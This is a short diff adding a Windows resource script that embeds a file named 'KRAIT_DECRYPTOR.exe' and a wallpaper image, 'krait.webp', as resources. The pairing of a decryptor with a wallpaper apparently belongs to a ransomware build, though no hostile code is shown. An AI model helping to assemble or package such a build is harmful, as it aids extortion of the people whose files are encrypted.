@@ -1,0 +1,4 @@
+#include <windows.h>
+
+IDR_DECRYPTOR RCDATA "KRAIT_DECRYPTOR.exe"
+IDR_WALLPAPER RCDATA "krait.webp"
